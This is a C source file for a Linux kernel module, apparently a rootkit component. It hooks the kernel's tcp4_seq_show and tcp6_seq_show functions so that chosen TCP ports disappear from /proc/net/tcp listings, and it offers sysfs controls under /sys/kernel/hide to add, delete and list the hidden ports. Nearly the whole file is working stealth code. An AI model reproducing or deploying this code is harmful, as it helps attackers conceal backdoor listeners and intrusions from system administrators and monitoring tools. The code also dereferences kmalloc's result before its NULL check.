#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/hashtable.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/sysfs.h>
#include <linux/types.h>
#include <linux/slab.h>
#include <linux/tcp.h>

#include "yhook.h"

#define MODULE_NAME "hide"
#define LOG_PREFIX "hide: "
#define SYS_DIR_NAME "hide"

struct port_info {// struct luu thong tin cua port theo kieu stack
    int port;
    struct port_info *next;
};

struct port_info *get_port_info_list_head(void);

static struct port_info *port_info_list_head;
static struct port_info *port_info_list_tail;

/* implement for tcp4 and tcp6 */
// ẩn cổng TCP trong hệ thống
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v != SEQ_START_TOKEN){
        struct port_info *cur;

        cur = port_info_list_head;
        cur = cur->next;
        while (cur != NULL){
            if (cur->port == sk->sk_num) {
                pr_info("hide tcp4 port:%d\n",sk->sk_num);
                return 0;
            }
            cur = cur->next;    
        }     
    }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v != SEQ_START_TOKEN){
        struct port_info *cur;

        cur = port_info_list_head;
        cur = cur->next;
        while (cur != NULL){
            if (cur->port == sk->sk_num) {
                pr_info("hide tcp6 port:%d\n",sk->sk_num);
                return 0;
            }
            cur = cur->next;    
        }     
    }
    return orig_tcp6_seq_show(seq, v);
}

struct port_info *get_port_info_list_head(void){
    return port_info_list_head;
}

// them port khoi danh sach port duoc an
int port_add(int port) {
    struct port_info *port_info_list_node,*tmp;
    /* check if the port is already hidden */
    tmp = port_info_list_head->next;
    while (tmp != NULL)
    {
        if(tmp->port == port){
            pr_info(LOG_PREFIX "port %d is ALREADY hidden!\n",port);
            return -ENOMEM;
        }
        tmp = tmp->next;
    }
    port_info_list_node = (struct port_info *)kmalloc(sizeof(struct port_info), GFP_KERNEL);
    port_info_list_node->port = port;
    if (!port_info_list_node)
        return -ENOMEM;
    port_info_list_tail->next = port_info_list_node;
    port_info_list_tail = port_info_list_tail->next;
    pr_info(LOG_PREFIX "port %d is hidden!\n",port);
    return 0;
}

// xoa port khoi danh sach an
int port_del(int port) {
    struct port_info *node,*tmp;
    node = port_info_list_head;
    while (node->next != NULL && node->next->port != port)
    {
        node = node->next;
    }
    if (node->next == NULL){
        pr_info(LOG_PREFIX "no port %d to del...\n",port);
        return -ENOMEM;
    }
    if (node->next == port_info_list_tail){
        port_info_list_tail = node;
    }
    tmp = node->next;
    node->next = node->next->next;
    kfree(tmp);
    pr_info(LOG_PREFIX "port %d is unhidden!\n",port);
    return 0;
}
//  cac ham de lam viec voi kernel sysfs : list, add, del
static ssize_t port_kobj_list(struct kobject *kobj,
                                   struct kobj_attribute *attr, char *buf) {
    size_t remain_size = PAGE_SIZE;
    size_t offset = 0;
    int count;
    struct port_info *cur;

    cur = get_port_info_list_head();
    cur = cur->next;
    while (cur != NULL) {
        if (remain_size <= 0)
            break;
        count = scnprintf(buf + offset, remain_size, "%d\n", cur->port);
        remain_size -= count;
        offset += count;
        cur = cur->next;
    }
    return offset;
}

static ssize_t port_kobj_add(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    unsigned int port;
    int retval;

    retval = kstrtouint(buf, 10, &port);
    if (retval)
        return retval;
    retval = port_add(port);
    if (retval < 0)
        return retval;
    return count;
}

static ssize_t port_kobj_del(struct kobject *kobj,
                                  struct kobj_attribute *attr, const char *buf,
                                  size_t count) {
    unsigned int port;
    int retval;

    retval = kstrtouint(buf, 10, &port);
    if (retval)
        return retval;
    retval = port_del(port);
    if (retval < 0)
        return retval;
    return count;
}

static struct kobj_attribute port_kobj_list_attribute =
    __ATTR(list, 0400, port_kobj_list, NULL);
static struct kobj_attribute port_kobj_add_attribute =
    __ATTR(add, 0200, NULL, port_kobj_add);
static struct kobj_attribute port_kobj_del_attribute =
    __ATTR(del, 0200, NULL, port_kobj_del);

static struct attribute *port_attrs[] = {
    &port_kobj_list_attribute.attr, &port_kobj_add_attribute.attr,
    &port_kobj_del_attribute.attr, NULL};

static struct attribute_group port_attr_group = {
    .name = "port",
    .attrs = port_attrs,
};

static struct kobject *module_kobj;

static int __init hide_init(void) {
    int retval = 0;
    pr_info(LOG_PREFIX "call hide_init()\n");
    yhook_init();
     port_info_list_head = NULL;
    port_info_list_tail = NULL;
    port_info_list_head = (struct port_info *)kmalloc(sizeof(struct port_info), GFP_KERNEL);
    if (!port_info_list_head)
        return -ENOMEM;
    port_info_list_head->port = -1;
    port_info_list_tail = port_info_list_head;
    hook_function_name_add("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show);
    hook_function_name_add("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show);
    /* create /sys/kernel/${SYS_DIR_NAME}/ */
    module_kobj = kobject_create_and_add(SYS_DIR_NAME, kernel_kobj);
    if (!module_kobj)
        return -ENOMEM;
    /* create /sys/kernel/${SYS_DIR_NAME}/port/ */
    retval = sysfs_create_group(module_kobj, &port_attr_group);
    if (retval)
    {
        kobject_put(module_kobj);
        return retval;
    }
    return retval;

    return 0;
}

static void __exit hide_exit(void) {
    pr_info(LOG_PREFIX "call hide_exit()\n");
    hook_function_del("tcp4_seq_show");
    hook_function_del("tcp6_seq_show");
    while (port_info_list_head != NULL)
    {
        struct port_info *tmp;
        tmp = port_info_list_head;
        port_info_list_head = port_info_list_head->next;
        if(tmp->port != -1)
            pr_info(LOG_PREFIX "port %d is auto unhidden when hide exit...\n",tmp->port);
        kfree(tmp);
    }
    port_info_list_tail = port_info_list_head = NULL;
    if (module_kobj)
        kobject_put(module_kobj);
}

module_init(hide_init);
module_exit(hide_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dibby Ill");
MODULE_DESCRIPTION("Hides a port.");
MODULE_VERSION("0.01");
